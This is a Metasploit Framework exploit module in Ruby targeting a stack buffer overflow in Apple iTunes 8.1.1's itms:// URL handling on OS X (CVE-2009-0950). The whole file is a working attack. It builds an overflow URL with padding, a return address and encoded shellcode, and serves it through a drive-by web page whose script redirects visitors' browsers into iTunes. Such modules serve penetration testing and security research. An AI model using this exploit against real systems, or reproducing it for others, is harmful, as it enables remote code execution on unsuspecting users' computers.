##
# $Id: itms_overflow.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple OS X iTunes 8.1.1 ITMS Overflow',
			'Description'    => %q{
					This modules exploits a stack-based buffer overflow in iTunes
				itms:// URL parsing.  It is accessible from the browser and
				in Safari, itms urls will be opened in iTunes automatically.
				Because iTunes is multithreaded, only vfork-based payloads should
				be used.
			},
			'Author'         => [ 'Will Drewry <redpig [at] dataspill.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2009-0950' ],
					[ 'OSVDB', '54833' ],
					[ 'URL', 'http://support.apple.com/kb/HT3592' ],
					[ 'URL', 'http://redpig.dataspill.org/2009/05/drive-by-attack-for-itunes-811.html' ]
				],
			'Payload'        =>
				{
					'Space'       => 1024,  # rough estimate of what browsers will pass.
					'DisableNops' => true,  # don't pad out the space.
					'BadChars' => '',
					# The encoder must be URL-safe otherwise it will be automatically
					# URL encoded.
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',  # See the comments below
							'BufferOffset' => 3,  # See the comments below
						},
				},
			'Targets'	=>
				[
					[
						'OS X',
						{
							'Platform'      => [ 'osx' ],
							'Arch'          => ARCH_X86,
							'Addr'          => 'ATe'
						},
					]
				],
			'DisclosureDate' => 'Jun 01 2009',
			'DefaultTarget'  => 0))
	end

	# Generate distribution script, which calls our payload using JavaScript.
	def generate_itms_page(p)
		# Set the base itms url.
		# itms:// or itmss:// can be used.  The trailing colon is used
		# to start the attack.  All data after the colon is copied to the
		# stack buffer.
		itms_base_url = "itms://:"
		itms_base_url << rand_text_alpha(268)  # Fill up the real buffer
		itms_base_url << rand_text_alpha(16)   # $ebx, $esi, $edi, $ebp
		itms_base_url << target['Addr']  # hullo there, jmp *%ecx!
		# The first '/' in the buffer will terminate the copy to the stack buffer.
		# In addition, $ecx will be left pointing to the last 6 bytes of the heap
		# buffer containing the full URL.  However, if a colon and a ? occur after
		# the value in ecx will point to that point in the heap buffer.  In our
		# case, it will point to the beginning.  The ! is there to make the
		# alphanumeric shellcode execute easily.  (This is why we need an offset
		# of 3 in the payload).
		itms_base_url << "/:!?"   # Truncate the stack buffer overflow and prep for payload
		itms_base_url << p # Wooooooo! Payload time.
		# We drop on a few extra bytes as the last few bytes can sometimes be
		# corrupted.
		itms_base_url << rand_text_alpha(4)

		# Use the pattern creator to simplify exploit creation :)
		# itms_base_url << Rex::Text.pattern_create(1024,
		#                                           Rex::Text::DefaultPatternSets)

		# Return back an example URL.  Using an iframe doesn't work with all
		# browsers, but that's easy enough to fix if you need to.
		return String(<<-EOS)
<html><head><title>iTunes loading . . .</title></head>
<body>
<script>document.location.assign("#{itms_base_url}");</script>
<p>iTunes should open automatically, but if it doesn't, click to
<a href="#{itms_base_url}">continue</a>.</p>a
</body>
</html>
EOS
	end

	def on_request_uri(cli, request)
		print_status("Generating payload...")
		return unless (p = regenerate_payload(cli))
		#print_status("=> #{payload.encoded}")
		print_status("=> #{payload.encoded.length} bytes")

		print_status("Generating HTML container...")
		page = generate_itms_page(payload.encoded)
		#print_status("=> #{page}")
		print_status("Sending itms page to #{cli.peerhost}:#{cli.peerport}")

		header = { 'Content-Type' => 'text/html' }
		send_response_html(cli, page, header)
		handler(cli)
	end

end
